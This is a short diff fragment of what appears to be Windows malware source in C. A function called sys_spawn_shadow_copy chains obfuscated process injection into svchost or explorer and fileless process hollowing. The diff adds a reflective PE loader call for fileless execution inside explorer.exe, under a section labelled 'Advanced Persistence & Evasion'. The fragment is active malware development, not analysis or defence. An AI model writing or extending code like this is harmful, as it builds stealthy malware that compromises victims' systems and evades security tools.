@@ -354,6 +354,8 @@ void sys_spawn_shadow_copy(void) {
     obf_sys_inject_process();      /* obfuscated svchost/explorer injection */
     Sleep(2000);
     obf_sys_hollow_process();      /* obfuscated fileless hollowing */
+    Sleep(1000);
+    obf_reflective_load();         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
 }
 
 /* === Advanced Persistence & Evasion === */
